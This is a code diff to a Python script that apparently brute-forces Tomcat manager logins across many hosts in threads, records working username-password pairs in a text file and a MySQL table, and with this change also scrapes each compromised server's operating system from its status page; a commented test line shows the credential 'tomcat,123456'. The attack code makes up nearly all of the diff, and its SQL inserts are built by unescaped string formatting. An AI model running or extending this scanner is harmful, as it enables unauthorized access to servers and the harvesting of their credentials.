@@ -4,6 +4,7 @@ import logging
 import os
 from queue import Queue
 from threading import Thread
+from lxml import etree
 
 import pymysql
 import requests
@@ -51,13 +52,13 @@ def init(tablename):
         database = db[1]
         cursor = database.cursor(pymysql.cursors.DictCursor)
         cursor.execute(
-            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),uname varchar(100),pwd varchar(100),primary key(id))charset=utf8;")
+            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),uname varchar(100),pwd varchar(100),os varchar(100),primary key(id))charset=utf8;")
         database.commit()
         cursor.close()
         database.close()
 
 
-def insert(tablename, url, user, pwd, ip, port):
+def insert(tablename, url, user, pwd, ip, port,os):
     global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
     db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
     if db[0]:
@@ -72,10 +73,10 @@ def insert(tablename, url, user, pwd, ip, port):
                 break
         if b:
             cursor.execute(
-                "insert into " + tablename + " (url,uname,pwd,ip,port) VALUES ('{}','{}','{}','{}',{})".format(url,
+                "insert into " + tablename + " (url,uname,pwd,ip,port,os) VALUES ('{}','{}','{}','{}',{},'{}')".format(url,
                                                                                                                user,
                                                                                                                pwd, ip,
-                                                                                                               port))
+                                                                                                               port,os))
             database.commit()
         cursor.close()
         database.close()
@@ -97,9 +98,15 @@ def attack(ip, port, data):
     try:
         r = requests.get(target, headers=headers, verify=False, timeout=5)
         if r.status_code == 200 and "JVM" in r.text:
+            html=etree.HTML(r.text)
+            os=""
+            try:
+                os=html.xpath('//td[@class="row-center"]')[-5].xpath("small/text()")[0]
+            except IndexError as e:
+                os="Unknown"
             with open("success.txt", 'a+', encoding='utf-8') as f1:
                 f1.write("%s\t%s\n" % (target, a))
-                insert(TABLENAME, target, data.split(",")[0], data.split(",")[1], ip, port)
+                insert(TABLENAME, target, data.split(",")[0], data.split(",")[1], ip, port,os)
             print("%s\t%s" % (target, a))
             return True
     except Exception as e:
@@ -142,3 +149,4 @@ if __name__ == '__main__':
         t.start()
     for t in threads:
         t.join()
+    # print(attack('127.0.0.1',8080,'tomcat,123456'))
